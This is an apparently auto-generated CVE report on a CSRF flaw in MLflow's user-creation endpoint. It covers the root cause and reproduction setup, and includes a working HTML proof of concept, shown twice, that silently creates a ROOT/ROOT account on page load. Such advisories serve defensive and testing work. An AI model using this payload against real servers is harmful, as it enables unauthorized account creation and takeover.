"# CVE Report for CVE-2025-1473\n\n## Summary\nCVE-2025-1473 is a Cross-Site Request Forgery (CSRF) vulnerability identified in the Signup feature of the `mlflow/mlflow` software, specifically affecting versions 2.17.0 to 2.20.1. This vulnerability allows an attacker to create a new user account without the consent of an authenticated user, potentially enabling unauthorized actions on behalf of the malicious user.\n\n### Vulnerability Type\n- **CWE-352**: Cross-Site Request Forgery (CSRF)\n\n### Affected Version\n- **mlflow**: v2.20.1\n\n## Root Cause of the Vulnerability\nThe root cause of the CSRF vulnerability lies in the lack of CSRF protection mechanisms in the Signup feature of the MLflow application. CSRF attacks exploit the trust that a web application has in the user's browser. In this case, an attacker can craft a malicious web page that, when visited by an authenticated user, can submit a request to create a new user account without the user's consent.\n\nThe provided proof-of-concept (PoC) demonstrates this vulnerability by automatically submitting a form to the Signup endpoint when the page is loaded. The absence of CSRF tokens or other validation mechanisms allows this unauthorized action to occur.\n\n### Analysis of the Patch\nThe patch provided in the advisory does not directly address the CSRF vulnerability but rather focuses on other unrelated changes in the codebase. The lack of CSRF protection in the Signup feature indicates that the application does not validate the origin of requests, which is a critical security oversight.\n\n## Exploitation Details\nTo exploit this vulnerability, an attacker would need to create a malicious web page that includes a form submission to the Signup endpoint of the MLflow application. When an authenticated user visits this page, the form would automatically submit, creating a new user account without the user's knowledge.\n\n### Proof of Concept (PoC)\nThe PoC provided in the advisory is as follows:\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>CSRF Attack</title>\n</head>\n<body onload=\"document.forms['csrfForm'].submit();\">\n    <form id=\"csrfForm\" action=\"http://127.0.0.1:5000/api/2.0/mlflow/users/create\" method=\"POST\">\n        <input type=\"hidden\" name=\"username\" value=\"ROOT\">\n        <input type=\"hidden\" name=\"password\" value=\"ROOT\">\n    </form>\n</body>\n</html>\n```\n\n## Environment Setup Requirements\n- **Port**: 5000\n- **Target Endpoint**: `/api/2.0/mlflow/users/create`\n- **Explicit Configuration**: None explicitly mentioned in the advisory.\n\n## Complete PoC Code\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>CSRF Attack</title>\n</head>\n<body onload=\"document.forms['csrfForm'].submit();\">\n    <form id=\"csrfForm\" action=\"http://127.0.0.1:5000/api/2.0/mlflow/users/create\" method=\"POST\">\n        <input type=\"hidden\" name=\"username\" value=\"ROOT\">\n        <input type=\"hidden\" name=\"password\" value=\"ROOT\">\n    </form>\n</body>\n</html>\n```\n\nThis report outlines the critical aspects of CVE-2025-1473, including its nature, root cause, exploitation details, and the necessary environment setup to reproduce the vulnerability. The lack of CSRF protection in the Signup feature poses a significant risk, and it is recommended that the maintainers implement appropriate CSRF mitigation strategies to secure the application.\n\n## Inferred Environment Configuration\n- Port: 5000\n- Startup Command: mlflow server --app-name basic-auth --host 0.0.0.0 --port 5000\n- Target Endpoint: /api/2.0/mlflow/users/create\n- Framework: mlflow\n- Special Mode: basic-auth\n- Reasoning: 从 PoC URL 中提取端口: 5000; 从 PoC URL 中提取端点: /api/2.0/mlflow/users/create; 检测到框架: MLflow; 端点 /api/2.0/mlflow/users/create 需要 basic-auth 模式: MLflow 用户管理功能需要启用 basic-auth 模式\n"